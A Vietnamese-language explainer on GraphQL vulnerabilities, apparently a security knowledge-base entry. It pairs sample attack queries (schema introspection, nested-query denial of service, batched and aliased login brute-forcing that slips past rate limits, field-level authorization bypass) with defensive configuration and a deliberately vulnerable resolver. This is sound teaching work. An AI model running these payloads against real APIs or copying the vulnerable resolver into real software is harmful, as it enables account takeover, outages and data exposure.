# GraphQL Vulnerabilities

> **OWASP**: API Security | **CWE**: CWE-200, CWE-400 | **Nguồn**: PortSwigger, HackTricks, GraphQL Spec

## 🧱 Kiến thức Nền tảng

**GraphQL** là ngôn ngữ truy vấn API do Facebook phát triển (2015), cho phép client yêu cầu chính xác dữ liệu cần thiết thay vì nhận toàn bộ resource như REST. GraphQL sử dụng một endpoint duy nhất (thường là `/graphql`) và ba loại operation: **Query** (đọc), **Mutation** (ghi), **Subscription** (real-time).

Một tính năng đặc biệt của GraphQL là **introspection** — cho phép client truy vấn schema (cấu trúc API) để biết tất cả types, fields, queries, và mutations có sẵn. Đây là công cụ mạnh cho developer nhưng cũng là nguồn thông tin quý giá cho kẻ tấn công.

GraphQL xử lý tất cả request qua POST đến cùng endpoint, khiến rate limiting truyền thống (dựa trên URL path) không hiệu quả. Client cũng có thể gửi **batch queries** — nhiều query trong cùng một request.

```graphql
# Normal GraphQL query — client requests exactly what it needs
query {
  user(id: "123") {
    name
    email
    orders {
      id
      total
    }
  }
}

# Normal mutation — creating a new resource
mutation {
  createPost(input: { title: "Hello", body: "World" }) {
    id
    createdAt
  }
}
```

```json
// Normal GraphQL response — returns only requested fields
{
  "data": {
    "user": {
      "name": "Alice",
      "email": "alice@example.com",
      "orders": [
        { "id": "o1", "total": 99.99 }
      ]
    }
  }
}
```

## 🔍 Mô tả lỗ hổng

GraphQL API có nhiều attack surface đặc thù:

- **Introspection abuse**: lộ toàn bộ schema, bao gồm internal types và mutations ẩn
- **Nested query DoS**: truy vấn lồng nhau tạo exponential data loading
- **Batch query abuse**: gửi hàng nghìn query trong một request để brute force
- **Authorization bypass**: field-level authorization bị thiếu — user có thể truy vấn field nhạy cảm
- **Injection**: GraphQL variables không được sanitize trước khi truyền vào resolver

## ⚔️ Cơ chế tấn công

**1. Introspection — Khám phá toàn bộ API schema:**

```graphql
# Full introspection query — reveals ALL types, fields, and mutations
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
  }
}

# Discover specific hidden queries
query {
  __type(name: "Query") {
    fields {
      name          # Reveals: users, adminPanel, internalMetrics, debugLog...
      description
    }
  }
}
```

**2. Nested Query DoS — Exponential resource consumption:**

```graphql
# Deeply nested query — each level multiplies database queries
# If user has 10 friends, each with 10 friends... = 10^5 = 100,000 DB queries!
query NestedDoS {
  users {                    # Level 0: 100 users
    friends {                # Level 1: 100 × 50 friends = 5,000
      friends {              # Level 2: 5,000 × 50 = 250,000
        friends {            # Level 3: 250,000 × 50 = 12,500,000
          friends {          # Level 4: CRASH — server out of memory
            name
            email
          }
        }
      }
    }
  }
}
```

**3. Batch Query — Brute force OTP/password trong một request:**

```json
// Single request with 1000 login attempts — bypasses rate limiting!
// Rate limiter sees: 1 request to /graphql ✓
// Server processes: 1000 login mutations
[
  {"query": "mutation { login(user:\"admin\", pass:\"000000\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"000001\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"000002\") { token } }"},
  // ... 997 more attempts ...
  {"query": "mutation { login(user:\"admin\", pass:\"999999\") { token } }"}
]
```

**4. Alias-based batching (khi array batching bị chặn):**

```graphql
# Use aliases to send multiple queries in a single query string
query {
  attempt1: login(user: "admin", pass: "123456") { token }
  attempt2: login(user: "admin", pass: "password") { token }
  attempt3: login(user: "admin", pass: "admin123") { token }
  # Each alias is a separate resolver execution
  # Rate limiter sees ONE query, but 3 login attempts happen
}
```

**5. Authorization bypass — Accessing fields without proper checks:**

```graphql
# Normal user query — should only see their own data
query {
  user(id: "other-user-id") {
    name
    email
    ssn              # Sensitive field — no field-level auth check!
    creditCardLast4  # Another sensitive field exposed
    role             # Reveals admin/user role
  }
}
```

## 🛡️ Biện pháp phòng thủ

1. **Tắt introspection trong production:**

```javascript
// Apollo Server — disable introspection in production
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production', // Only in dev
});
```

2. **Giới hạn query depth và complexity:**

```javascript
// Using graphql-depth-limit and graphql-query-complexity
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    depthLimit(5),                         // Max 5 levels of nesting
    createComplexityLimitRule(1000, {       // Max complexity score of 1000
      scalarCost: 1,
      objectCost: 10,
      listFactor: 20,                      // Lists multiply cost significantly
    }),
  ],
});
```

3. **Rate limit theo operation, không theo request:**

```javascript
// Count operations, not HTTP requests
app.use('/graphql', (req, res, next) => {
  const body = req.body;
  const operationCount = Array.isArray(body) ? body.length : 1;
  // Apply rate limit based on total operation count
  if (operationCount > 5) {
    return res.status(429).json({ error: 'Too many operations per request' });
  }
  next();
});
```

4. **Field-level authorization** — kiểm tra quyền truy cập cho từng field nhạy cảm.

5. **Disable query batching** nếu không cần thiết.

## 💻 Code Example

```javascript
// === VULNERABLE: No depth limit, no auth checks, introspection enabled ===
const resolvers = {
  Query: {
    user: (_, { id }) => db.users.findById(id),  // No authorization check!
  },
  User: {
    friends: (user) => db.users.findFriendsByUserId(user.id), // Allows infinite nesting
    ssn: (user) => user.ssn,  // Sensitive field with no access control
  },
};

// === SECURE: Depth-limited, authorized, introspection disabled ===
const resolvers = {
  Query: {
    user: (_, { id }, context) => {
      // Verify the requesting user has permission to view this profile
      if (context.user.id !== id && context.user.role !== 'admin') {
        throw new ForbiddenError('Access denied');
      }
      return db.users.findById(id);
    },
  },
  User: {
    ssn: (user, _, context) => {
      // Field-level auth: only the user themselves or admins can see SSN
      if (context.user.id !== user.id && context.user.role !== 'admin') {
        return null;  // Return null instead of throwing to avoid info leakage
      }
      return user.ssn;
    },
  },
};
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/graphql
- OWASP: https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
- CWE-400: https://cwe.mitre.org/data/definitions/400.html
- HackTricks: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html
